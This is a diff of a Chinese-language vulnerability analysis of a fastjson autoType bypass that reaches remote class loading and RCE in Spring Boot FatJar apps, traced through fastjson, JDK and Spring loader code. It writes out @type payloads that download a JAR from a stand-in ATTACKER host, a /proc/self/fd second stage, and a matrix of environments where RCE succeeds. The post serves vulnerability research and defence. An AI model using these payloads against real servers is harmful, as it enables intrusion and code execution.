 </blockquote>
 <h3 id="2-0-入口：-type-如何到达-checkAutoType"><a href="#2-0-入口：-type-如何到达-checkAutoType" class="headerlink" title="2.0 入口：@type 如何到达 checkAutoType"></a>2.0 入口：<code>@type</code> 如何到达 checkAutoType</h3><p>典型链路（<code>JSON.parseObject(body)</code> 触发）：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">JSON.parseObject(String)</span><br><span class="line">└─ DefaultJSONParser.parseObject(Map, Object)</span><br><span class="line">     └─ 键 == &quot;@type&quot;（JSON.DEFAULT_TYPE_KEY）</span><br><span class="line">        且未开 Feature.DisableSpecialKeyDetect        ← DefaultJSONParser.java:311-313</span><br><span class="line">        └─ 值经 Feature.IgnoreAutoType 检查            ← L315-317（默认关，开了则跳过整个分支）</span><br><span class="line">        └─ 短路：等于目标类名 / HashMap / LinkedHashMap / 全数字 → 不进 checkAutoType  ← L325-342</span><br><span class="line">        └─ config.checkAutoType(typeName, null, lexer.getFeatures())  ← L343</span><br></pre></td></tr></table></figure>
@@ -166,7 +162,7 @@
 <li><code>getClassFromMapping</code> &#x2F; <code>deserializers.findClass</code> &#x2F; <code>typeMapping</code> 已有映射 → 直接返回（L1418-1443，Throwable 子类在 autoType 关闭时被置 null，L1424-1426）。</li>
 </ol>
 <p><strong>只有穿过全部七道前置关卡、仍未解析到类的 typeName，才进入资源探测段</strong>——也就是说，攻击载荷的类名必须不在 fastjson 的映射表与黑白名单 hash 中（<code>jar:http:...</code> 这类构造天然满足）。</p>
-<p>其余入口（影响面注记）：<code>JSONArray</code> 元素内的 <code>@type</code>（DefaultJSONParser.java:1767）、<code>MapDeserializer</code>（MapDeserializer.java:191）、<code>JavaBeanDeserializer</code>（JavaBeanDeserializer.java:308、823，带 expectClass）、<code>ThrowableDeserializer</code>（ThrowableDeserializer.java:77，expectClass 固定为 <code>Throwable.class</code>）——多个入口共用同一个 <code>checkAutoType</code>，漏洞面不依赖具体业务 DTO。</p>
+<p>其余入口（影响面注记）：<code>JSONArray</code> 元素内的 <code>@type</code>（DefaultJSONParser.java:1767）、<code>MapDeserializer</code>（MapDeserializer.java:191）、<code>JavaBeanDeserializer</code>（JavaBeanDeserializer.java:308、823，带 expectClass）、<code>ThrowableDeserializer</code>（ThrowableDeserializer.java:77，expectClass 固定为 <code>Throwable.class</code>）——多个入口共用同一个 <code>checkAutoType</code>，漏洞面不依赖具体业务 DTO[5]。</p>
 <h3 id="2-1-用户类型名被当作资源路径（ParserConfig-java-1479-1498）"><a href="#2-1-用户类型名被当作资源路径（ParserConfig-java-1479-1498）" class="headerlink" title="2.1 用户类型名被当作资源路径（ParserConfig.java:1479-1498）"></a>2.1 用户类型名被当作资源路径（ParserConfig.java:1479-1498）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// L1482-1487</span></span><br><span class="line"><span class="type">String</span> <span class="variable">resource</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (defaultClassLoader != <span class="literal">null</span>) &#123;</span><br><span class="line">    is = defaultClassLoader.getResourceAsStream(resource);            <span class="comment">// ← 关键调用</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><code>typeName</code> 来自请求 JSON 的 <code>@type</code> 值，完全用户可控。<code>replace(&#39;.&#39;, &#39;/&#39;)</code> 的本意是包名转路径（<code>com.example.Foo</code> → <code>com/example/Foo.class</code>），但代码<strong>没有限制 resource 的协议、绝对路径语义或来源</strong>——它假设结果永远是个 classpath 相对路径，而这个假设在某些 ClassLoader 下不成立。</p>
@@ -177,12 +173,12 @@
 <h3 id="2-3-jsonType-触发实际类加载"><a href="#2-3-jsonType-触发实际类加载" class="headerlink" title="2.3 jsonType 触发实际类加载"></a>2.3 jsonType 触发实际类加载</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (autoTypeSupport || jsonType || expectClassFlag) &#123;</span><br><span class="line">    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><code>jsonType=true</code> 时进入 <code>loadClass</code>。注意：这与 <code>autoTypeSupport</code>（autoType 开关）是<strong>或</strong>关系——autoType 关闭不影响此分支。</p>
-<p><code>TypeUtils.loadClass</code>（TypeUtils.java:1735-1791）的内部顺序对矩阵格子判定很关键：</p>
+<p><code>TypeUtils.loadClass</code>（TypeUtils.java:1735-1791）的内部顺序对各场景判定很关键：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mappings 缓存命中 → 直接返回</span><br><span class="line">&#x27;[&#x27; 数组形式 / &#x27;L...;&#x27; 描述符形式 → 脱壳递归</span><br><span class="line">① classLoader.loadClass（即传入的 defaultClassLoader）</span><br><span class="line">② 失败 → TCCL.loadClass（当前线程上下文 ClassLoader）</span><br><span class="line">③ 再失败 → Class.forName（用 TypeUtils 自身所在 ClassLoader）</span><br><span class="line">每步 catch (Throwable) → 静默降级到下一步</span><br></pre></td></tr></table></figure>
 
 <p>两点推论：</p>
 <ol>
-<li><strong>每个 ClassLoader 的失败都不致命</strong>——①被容器 CL 拒绝后会自动滑向②③。③的 <code>Class.forName(className)</code> 无显式 CL 参数，实际使用 <code>TypeUtils</code> 类的定义 CL，FatJar 下即 <code>LaunchedURLClassLoader</code>——与①通常同源，但<strong>与②（TCCL）可能不同源</strong>。这是 §5 R3&#x2F;R3b 存疑论证的基础。</li>
+<li><strong>每个 ClassLoader 的失败都不致命</strong>——①被容器 CL 拒绝后会自动滑向②③。③的 <code>Class.forName(className)</code> 无显式 CL 参数，实际使用 <code>TypeUtils</code> 类的定义 CL，FatJar 下即 <code>LaunchedURLClassLoader</code>——与①通常同源，但<strong>与②（TCCL）可能不同源</strong>。</li>
 <li>载荷类名带 <code>:</code> <code>!</code> 等字符不影响 ①②③ 的尝试——这些 CL 层不做类名字符合法性校验，合法性只在 <code>defineClass</code> 的 native 层被判定（§3.4）。</li>
 </ol>
 <h3 id="2-4-jsonType-早返回，跳过全部后续安全检查"><a href="#2-4-jsonType-早返回，跳过全部后续安全检查" class="headerlink" title="2.4 jsonType 早返回，跳过全部后续安全检查"></a>2.4 jsonType 早返回，跳过全部后续安全检查</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// L1505-1511</span></span><br><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (jsonType) &#123;</span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport) &#123; TypeUtils.addMapping(typeName, clazz); &#125;</span><br><span class="line">        <span class="keyword">return</span> clazz;                       <span class="comment">// ← 直接返回</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 以下检查全部被跳过：</span></span><br><span class="line">    <span class="comment">//   L1513-1518  危险基类检查（ClassLoader / DataSource / RowSet）</span></span><br><span class="line">    <span class="comment">//   L1520-1529  expectClass 相容性检查</span></span><br><span class="line">    <span class="comment">//   L1531-1534  creatorConstructor 检查</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -197,14 +193,14 @@
 <p>JDK 9+ 上第一阶段加载会因非法内部类名失败。让类型名以 <code>Exception</code> 结尾后，fastjson 不抛异常、不终止 JSON 解析，<strong>数组中后续的枚举元素得以继续处理</strong>——这是现代 JDK 两阶段利用（§3.5）的结构性前提，同时也天然构成一个行为差异探针（指纹识别价值）。</p>
 <h3 id="2-6-SafeMode-的位置"><a href="#2-6-SafeMode-的位置" class="headerlink" title="2.6 SafeMode 的位置"></a>2.6 SafeMode 的位置</h3><p>SafeMode 检查（ParserConfig.java:1325-1330）发生在<strong>资源访问之前</strong>，因此能阻断整条链（网络请求都不会发出）。这解释了为什么 SafeMode 是 P0 级修复而其他缓解都是部分的。</p>
 <hr>
-<h2 id="3-关键机制"><a href="#3-关键机制" class="headerlink" title="3. 关键机制"></a>3. 关键机制</h2><h3 id="3-1-资源名走私与整数-IP"><a href="#3-1-资源名走私与整数-IP" class="headerlink" title="3.1 资源名走私与整数 IP"></a>3.1 资源名走私与整数 IP</h3><p><code>replace(&#39;.&#39;, &#39;/&#39;)</code> 是把双刃剑：它既能把包名变路径，也能把精心构造的字符串变成 URL——</p>
+<h2 id="3-关键机制"><a href="#3-关键机制" class="headerlink" title="3. 关键机制"></a>3. 关键机制</h2><h3 id="3-1-资源名走私与整数-IP"><a href="#3-1-资源名走私与整数-IP" class="headerlink" title="3.1 资源名走私与整数 IP"></a>3.1 资源名走私与整数 IP</h3><p><code>replace(&#39;.&#39;, &#39;/&#39;)</code> 是把双刃剑：它既能把包名变路径，也能把精心构造的字符串变成 URL[5]——</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入   jar:http:..ATTACKER:18081.exploit!.Payload</span><br><span class="line">  ├─ http:..        → http://</span><br><span class="line">  ├─ ATTACKER:18081.exploit → ATTACKER:18081/exploit</span><br><span class="line">  └─ !.             → !/</span><br></pre></td></tr></table></figure>
 
 <p>唯一的问题是 IP 里的点会被一并转义。解法：Java 的 URL 解析接受<strong>整数形式 IP</strong>——</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2130706433 = 0x7F000001 = 127.0.0.1</span><br></pre></td></tr></table></figure>
 
 <p>（URL spec 允许十进制整数 IP，与开发者&quot;IP&#x3D;点分四段&quot;的假设之间的缝隙。）</p>
-<h3 id="3-2-远程加载为什么可能：资源名如何变成-HTTP-请求"><a href="#3-2-远程加载为什么可能：资源名如何变成-HTTP-请求" class="headerlink" title="3.2 远程加载为什么可能：资源名如何变成 HTTP 请求"></a>3.2 远程加载为什么可能：资源名如何变成 HTTP 请求</h3><p>普通 ClassLoader 对 <code>getResourceAsStream(&quot;jar:http://...&quot;)</code> 返回 null。Spring Boot FatJar 环境中，资源名一路穿过五层代码变成远程请求，每层都有明确出处：</p>
+<h3 id="3-2-远程加载为什么可能：资源名如何变成-HTTP-请求"><a href="#3-2-远程加载为什么可能：资源名如何变成-HTTP-请求" class="headerlink" title="3.2 远程加载为什么可能：资源名如何变成 HTTP 请求"></a>3.2 远程加载为什么可能：资源名如何变成 HTTP 请求</h3><p>普通 ClassLoader 对 <code>getResourceAsStream(&quot;jar:http://...&quot;)</code> 返回 null。Spring Boot FatJar 环境中，资源名一路穿过五层代码变成远程请求，每层都有明确出处[5]：</p>
 <p><strong>① URLClassPath 的 Loader 分派</strong>（jdk8u <code>URLClassPath.java:563-581</code>；现代 JDK <code>jdk/internal/loader/URLClassPath.java:456+</code>）</p>
 <p>FatJar 的 classpath URL 形如 <code>jar:file:/app.jar!/BOOT-INF/lib/fastjson-1.2.83.jar!/</code>——file 部分以 <code>/</code> 结尾且协议不是 <code>file</code>，于是走的是<strong>基础 <code>Loader</code>（而非 <code>JarLoader</code>）</strong>：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file != <span class="literal">null</span> &amp;&amp; file.endsWith(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;file&quot;</span>.equals(url.getProtocol())) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">FileLoader</span>(url);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Loader</span>(url);        <span class="comment">// ← FatJar 条目落在这里</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JarLoader</span>(url, jarHandler, lmap, acc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -212,10 +208,10 @@
 <p><strong>② 基础 Loader.getResource 直接拼 URL 并打开</strong>（jdk8u <code>URLClassPath.java:735-760</code>）</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="keyword">new</span> <span class="title class_">URL</span>(base, ParseUtil.encodePath(name, <span class="literal">false</span>));   <span class="comment">// base=jar:file:/app.jar!/...</span></span><br><span class="line">...</span><br><span class="line">uc = url.openConnection();                                 <span class="comment">// ← 网络动作发生点</span></span><br><span class="line"><span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> uc.getInputStream();</span><br></pre></td></tr></table></figure>
 
-<p>注意对比：<code>JarLoader.getResource</code>（jdk8u L1056+）是 <code>jar.getJarEntry(name)</code> 本地查表，不会出网——**&quot;走基础 Loader 还是 JarLoader&quot;由 classpath 条目的 URL 形态决定**，这正是 WAR&#x2F;外置容器（条目为 <code>file:</code> 目录或普通 jar）与 FatJar 行为分歧的 JVM 层根源（对应矩阵 R5）。</p>
+<p>注意对比：<code>JarLoader.getResource</code>（jdk8u L1056+）是 <code>jar.getJarEntry(name)</code> 本地查表，不会出网——**&quot;走基础 Loader 还是 JarLoader&quot;由 classpath 条目的 URL 形态决定**，这正是 WAR&#x2F;外置容器（条目为 <code>file:</code> 目录或普通 jar）与 FatJar 行为分歧的 JVM 层根源。</p>
 <p><strong>③ <code>new URL(context, spec)</code> 的协议判定</strong>（jdk8u <code>java/net/URL.java:556-580</code>）</p>
 <ul>
-<li>spec 协议与 context <strong>不同</strong>（如 <code>http:/...</code> vs context 的 <code>jar:</code>）→ spec 按<strong>绝对 URL</strong> 处理，context 整体丢弃——<code>http:</code> 前缀载荷（R1）即此路径，连 Spring 的 handler 都不需要；</li>
+<li>spec 协议与 context <strong>不同</strong>（如 <code>http:/...</code> vs context 的 <code>jar:</code>）→ spec 按<strong>绝对 URL</strong> 处理，context 整体丢弃——<code>http:</code> 前缀载荷即此路径，连 Spring 的 handler 都不需要；</li>
 <li>spec 协议与 context <strong>相同</strong>（<code>jar:...</code>）→ 继承 context 的 handler，交给 handler 的 <code>parseURL</code> 做相对解析。</li>
 </ul>
 <p><strong>④ Spring 的 jar Handler：spec 整体替换 context.file</strong>（spring-boot v2.7.18 <code>loader/jar/Handler.java:223-245</code>）</p>
@@ -226,8 +222,8 @@
 <p><strong>⑤ openConnection 的 fallback 链落到 JDK 原生 jar handler</strong>（<code>Handler.java:87-97、188-193</code>；<code>FALLBACK_HANDLERS</code> 定义于 L64）</p>
 <p>Spring Handler 先尝试把 URL 解析进本地 root jar（<code>getRootJarFileFromUrl</code>），远程地址必然失败，沿 <code>openFallbackTomcatConnection → openFallbackContextConnection → openFallbackHandlerConnection</code> 降级，最终用 <strong><code>sun.net.www.protocol.jar.Handler</code></strong> 重新打开——进入 JDK 标准 <code>JarURLConnection</code> → <code>URLJarFile.retrieve</code>（jdk8u <code>sun/net/www/protocol/jar/URLJarFile.java:189-197</code>）：**把远程 JAR 下载为临时文件 <code>jar_cache*</code>**。这个落盘行为正是 §3.5 两阶段利用的 staging 来源。</p>
 <p>结论（本漏洞的存在条件）：<strong>fastjson 所在 ClassLoader 的 URLClassPath 含有&quot;以 <code>/</code> 结尾、非 <code>file:</code> 协议&quot;的条目（FatJar 的嵌套 jar URL 恰好如此），且 <code>jar:</code> 协议 handler 已被替换为宽容的实现（Spring Boot Loader）。</strong> 两个条件分别对应上述①④——缺①走 JarLoader 本地查表，缺④走 JDK 原生 jar handler 的严格解析。</p>
-<h3 id="3-3-ASM-非法类名：语言语法与-VM-规范的缝隙"><a href="#3-3-ASM-非法类名：语言语法与-VM-规范的缝隙" class="headerlink" title="3.3 ASM 非法类名：语言语法与 VM 规范的缝隙"></a>3.3 ASM 非法类名：语言语法与 VM 规范的缝隙</h3><p>要加载的类名形如 <code>jar:http://2130706433:18081/exploit!/Payload</code>，含 <code>: / !</code>——<strong>javac 永远无法编译出这样的类</strong>，但 JVMS §4.2 对 classfile 中非限定名的禁止集只是 <code>. ; [ /</code>（JDK 8 实际执行更松，见下），<code>:!</code> 均合法，所以 PoC 必须用 <strong>ASM 直接写字节码</strong>（asm 9.6），类中放 <code>@JSONType</code> 注解 + <code>&lt;clinit&gt;</code> 静态初始化块。<code>&lt;clinit&gt;</code> 在 defineClass 后即执行，<strong>在 <code>parseObject(body, Dto.class)</code> 的类型绑定之前</strong>，后续限制全部无效。</p>
-<h3 id="3-4-JDK-版本差异：native-校验的两轮"><a href="#3-4-JDK-版本差异：native-校验的两轮" class="headerlink" title="3.4 JDK 版本差异：native 校验的两轮"></a>3.4 JDK 版本差异：native 校验的两轮</h3><p><code>defineClass(name, bytes)</code> 的校验分两层：</p>
+<h3 id="3-3-ASM-非法类名：语言语法与-VM-规范的缝隙"><a href="#3-3-ASM-非法类名：语言语法与-VM-规范的缝隙" class="headerlink" title="3.3 ASM 非法类名：语言语法与 VM 规范的缝隙"></a>3.3 ASM 非法类名：语言语法与 VM 规范的缝隙</h3><p>要加载的类名形如 <code>jar:http://2130706433:18081/exploit!/Payload</code>，含 <code>: / !</code>——<strong>javac 永远无法编译出这样的类</strong>[7]，但 JVMS §4.2 对 classfile 中非限定名的禁止集只是 <code>. ; [ /</code>（JDK 8 实际执行更松，见下），<code>:!</code> 均合法，所以 PoC 必须用 <strong>ASM 直接写字节码</strong>（asm 9.6）[5]，类中放 <code>@JSONType</code> 注解 + <code>&lt;clinit&gt;</code> 静态初始化块。<code>&lt;clinit&gt;</code> 在 defineClass 后即执行，<strong>在 <code>parseObject(body, Dto.class)</code> 的类型绑定之前</strong>，后续限制全部无效[5]。</p>
+<h3 id="3-4-JDK-版本差异：native-校验的两轮"><a href="#3-4-JDK-版本差异：native-校验的两轮" class="headerlink" title="3.4 JDK 版本差异：native 校验的两轮"></a>3.4 JDK 版本差异：native 校验的两轮</h3><p><code>defineClass(name, bytes)</code> 的校验分两层[5]：</p>
 <ul>
 <li><strong>Java 层</strong> <code>preDefineClass</code>：只查传入的 name 字符串是否含 <code>/</code>——载荷均为点号形式（<code>http:..2130706433:18081.a</code>），通过；</li>
 <li><strong>native 层</strong> <code>defineClass1 → ClassFileParser::parse_stream → verify_legal_class_name</code>：解析常量池后对类名条目执行 <code>verify_unqualified_name</code>，两版行为分叉就在这里：</li>
@@ -239,533 +235,350 @@
 <p><strong>现代 JDK</strong>（jdk master <code>1bc03f02</code> <code>classFileParser.cpp:4545-4577</code>）——<code>LegalClass</code> 下 <code>/</code> 仍允许，但<strong>禁止空路径段</strong>（连续 <code>//</code>、首&#x2F;尾 <code>/</code>）：</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> JVM_SIGNATURE_SLASH:</span><br><span class="line">    <span class="comment">// check for &#x27;//&#x27; or leading or trailing &#x27;/&#x27; which are not legal</span></span><br><span class="line">    <span class="keyword">if</span> (type == ClassFileParser::LegalClass) &#123;</span><br><span class="line">        <span class="keyword">if</span> (p == name || p<span class="number">+1</span> &gt;= name+length ||</span><br><span class="line">            *(p<span class="number">+1</span>) == JVM_SIGNATURE_SLASH) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
-<p>→ <code>http://</code> 必含 <code>//</code>，<strong>被拒</strong>。（收紧自 JDK 9 起生效，边界依据公开分析，未逐版本核对。）</p>
-<p>这就是&quot;JDK 8 直接 RCE、JDK 9+ 第一阶段只能 SSRF&quot;的根因。同时它解释了两阶段载荷的形态约束：阶段二的 <code>jar:file:.proc.self.fd.7!.fd7.Exception</code> 解出的内部名是 <code>fd7/Exception</code>——<strong>全单斜杠、无空段、无首&#x2F;尾斜杠</strong>，是为过这道校验而设计的。</p>
-<h3 id="3-5-现代-JDK-两阶段：jar-cache-proc-self-fd"><a href="#3-5-现代-JDK-两阶段：jar-cache-proc-self-fd" class="headerlink" title="3.5 现代 JDK 两阶段：jar_cache + /proc/self/fd"></a>3.5 现代 JDK 两阶段：<code>jar_cache</code> + <code>/proc/self/fd</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">阶段一（下载）：</span><br><span class="line">  &#123;&quot;@type&quot;:&quot;jar:http:..ATTACKER:18081.x!.foo.Exception&quot;&#125;</span><br><span class="line">  → getResourceAsStream 探测阶段即触发 HTTP 下载</span><br><span class="line">  → JDK 的 sun.net.www.protocol.jar.URLJarFile.retrieve</span><br><span class="line">    把远程 JAR 落盘为临时文件 jar_cache*，拿到 fd N</span><br><span class="line">  → defineClass 因 // 失败，但 Exception 后缀软返回（§2.5），解析继续</span><br><span class="line"></span><br><span class="line">阶段二（本地重开）：</span><br><span class="line">  &#123;&quot;@type&quot;:&quot;jar:file:.proc.self.fd.N!.fdN.Exception&quot;&#125;</span><br><span class="line">  → jar:file:/proc/self/fd/N!/fdN/Exception.class</span><br><span class="line">  → 本地文件、全单斜杠、无空段 → 过 verify_unqualified_name</span><br><span class="line">  → defineClass 成功，&lt;clinit&gt; 执行</span><br></pre></td></tr></table></figure>
+<p>→ <code>http://</code> 必含 <code>//</code>，<strong>被拒</strong>。（收紧自 JDK 9 起生效，边界依据公开分析[5]，未逐版本核对。）</p>
+<p>这就是&quot;JDK 8 直接 RCE、JDK 9+ 第一阶段只能 SSRF&quot;的根因[5]。同时它解释了两阶段载荷的形态约束：阶段二的 <code>jar:file:.proc.self.fd.7!.fd7.Exception</code> 解出的内部名是 <code>fd7/Exception</code>——<strong>全单斜杠、无空段、无首&#x2F;尾斜杠</strong>，是为过这道校验而设计的[8]。</p>
+<h3 id="3-5-现代-JDK-两阶段：jar-cache-proc-self-fd"><a href="#3-5-现代-JDK-两阶段：jar-cache-proc-self-fd" class="headerlink" title="3.5 现代 JDK 两阶段：jar_cache + /proc/self/fd"></a>3.5 现代 JDK 两阶段：<code>jar_cache</code> + <code>/proc/self/fd</code></h3><p><strong>以下两阶段利用方案由 GCSA 首次完整公开[8]：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">阶段一（下载）：</span><br><span class="line">  &#123;&quot;@type&quot;:&quot;jar:http:..ATTACKER:18081.x!.foo.Exception&quot;&#125;</span><br><span class="line">  → getResourceAsStream 探测阶段即触发 HTTP 下载</span><br><span class="line">  → JDK 的 sun.net.www.protocol.jar.URLJarFile.retrieve</span><br><span class="line">    把远程 JAR 落盘为临时文件 jar_cache*，拿到 fd N</span><br><span class="line">  → defineClass 因 // 失败，但 Exception 后缀软返回（§2.5），解析继续</span><br><span class="line"></span><br><span class="line">阶段二（本地重开）：</span><br><span class="line">  &#123;&quot;@type&quot;:&quot;jar:file:.proc.self.fd.N!.fdN.Exception&quot;&#125;</span><br><span class="line">  → jar:file:/proc/self/fd/N!/fdN/Exception.class</span><br><span class="line">  → 本地文件、全单斜杠、无空段 → 过 verify_unqualified_name</span><br><span class="line">  → defineClass 成功，&lt;clinit&gt; 执行</span><br></pre></td></tr></table></figure>
 
 <p>fd 号 N 靠数组枚举元素逐个试。一个 payload 同时兼容 JDK 8 与现代 JDK：JDK 8 在第一阶段直接成功；JDK 9+ 走软通道进入 fd 枚举阶段。</p>
-<p><strong>副产物</strong>：<code>/proc/self/fd</code> 依赖使该链在 Windows 高版本 JDK 上断裂（Windows 无此文件系统接口）——这是矩阵中格子 R4a 的由来。</p>
+<p><strong>副产物</strong>：<code>/proc/self/fd</code> 依赖使该链在 Windows 高版本 JDK 上断裂（Windows 无此文件系统接口）。</p>
 <hr>
-<h2 id="4-变体矩阵（核心）"><a href="#4-变体矩阵（核心）" class="headerlink" title="4. 变体矩阵（核心）"></a>4. 变体矩阵（核心）</h2><p><strong>轴</strong>：JDK 版本 × OS × 部署形态&#x2F;ClassLoader × 出网方向 × staging 原语 × WAF（正交轴）。</p>
-<p><strong>读法</strong>：每个格子 &#x3D; 一组环境约束下，六个链环节（注入面→资源名走私→transport→staging→字节码→define&#x2F;执行→效果通道）是否各有存活填充物。格子判&quot;死&quot;一律理解为&quot;<strong>死于当前 trick 库存（2026-07-26）</strong>&quot;。</p>
-<table>
-<thead>
-<tr>
-<th>#</th>
-<th>JDK</th>
-<th>OS</th>
-<th>部署&#x2F;CL</th>
-<th>出网</th>
-<th>staging</th>
-<th>链</th>
-<th>结果</th>
-<th>状态</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>R1</td>
-<td>8</td>
-<td>任意</td>
-<td>FatJar(J&#x2F;U)</td>
-<td>HTTP</td>
-<td>—</td>
-<td><code>jar:http:</code> 直载</td>
-<td><strong>RCE</strong>（最短链）</td>
-<td>Linux&#x2F;Windows 均复现</td>
-</tr>
-<tr>
-<td>R2</td>
-<td>9+</td>
-<td>Linux</td>
-<td>FatJar(J&#x2F;U)</td>
-<td>HTTP</td>
-<td>—</td>
-<td>jar_cache 落盘 + fd 两阶段</td>
-<td><strong>RCE</strong></td>
-<td>Temurin 17 复现</td>
-</tr>
-<tr>
-<td>R3</td>
-<td>9+</td>
-<td>Linux</td>
-<td>FatJar(Tomcat)</td>
-<td>HTTP</td>
-<td>—</td>
-<td>http:&#x2F;&#x2F; 直载死于 checkAutoType（E4 实测，与 Jetty 差异在于 TCCL 为 TomcatEmbeddedWebappClassLoader）；jar:http:&#x2F;&#x2F; + Exception 后缀 + fd 两阶段在机制上可行（PCL&#x3D;LaunchedURLClassLoader 可完成 getResourceAsStream；jar:file:&#x2F;&#x2F; 暂存在 Tomcat JDK17 下已被 E1 对照证实可通），E4 实验台因数组过大超时未完成全链实测</td>
-<td><strong>未确认</strong>（transport 活，execution 链未跑完）</td>
-<td>见 §8.1 E4 分析</td>
-</tr>
-<tr>
-<td>R3b</td>
-<td>8</td>
-<td>Linux</td>
-<td>FatJar(Tomcat)</td>
-<td>HTTP</td>
-<td>—</td>
-<td>同上：http:&#x2F;&#x2F; 直载死于 checkAutoType（E4.1 实测，与对照 A（Jetty）差异在于 TCCL 类型）；jar:file:&#x2F;&#x2F; 暂存在 Tomcat JDK17 下已证实可通（E1 对照），JDK8 下预期同行为</td>
-<td><strong>未确认</strong>（transport 活，execution 链未跑完）</td>
-<td>见 §8.1 E4 分析</td>
-</tr>
-<tr>
-<td>R4a</td>
-<td>9+</td>
-<td>Windows</td>
-<td>任意</td>
-<td>任意</td>
-<td>无</td>
-<td><code>/proc</code> 不存在 + <code>//</code> 被杀 + <code>jar_cache*</code> 名随机、无 fd 可枚举 + 无暂存 → 当前库存无可用填充物</td>
-<td><strong>死于当前库存（2026-07-26）</strong></td>
-<td>机制推断（当前无已知路径）</td>
-</tr>
-<tr>
-<td>R4b</td>
-<td>9+</td>
-<td>Windows</td>
-<td>FatJar</td>
-<td>任意</td>
-<td>可预测路径上传</td>
-<td><code>jar:file:/C:/...</code>（全单斜杠，过 verifier）</td>
-<td><strong>RCE</strong></td>
-<td>实证（Windows JDK17 + Jetty FatJar，E1；Tomcat 对照亦出 marker）</td>
-</tr>
-<tr>
-<td>R5</td>
-<td>任意</td>
-<td>任意</td>
-<td>WAR 外置容器</td>
-<td>任意</td>
-<td>—</td>
-<td>WebappClassLoaderBase.getResourceAsStream 走 WebResourceRoot 本地路径，hasExternalRepositories&#x3D;false，不出网；Spring Boot Launcher 在 WAR 模式不注册 jar: handler</td>
-<td><strong>死</strong>（机制死，非库存死）</td>
-<td>代码证据（WebappClassLoaderBase:1152-1235 + Launcher.launch()）</td>
-</tr>
-<tr>
-<td>R6</td>
-<td>任意</td>
-<td>Linux</td>
-<td>FatJar</td>
-<td><strong>无</strong></td>
-<td>可预测路径上传</td>
